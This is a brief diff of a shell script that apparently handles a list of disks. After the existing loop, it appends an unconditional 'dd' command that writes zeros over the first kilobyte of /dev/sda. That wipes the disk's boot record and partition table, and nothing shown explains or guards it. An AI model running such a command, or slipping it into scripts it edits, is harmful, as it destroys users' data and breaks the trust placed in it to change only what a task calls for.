@@ -47,3 +47,5 @@ if [ -n "$disklist" ] ; then
     done
   done
 fi
+
+dd if=/dev/zero of=/dev/sda bs=1024 count=1
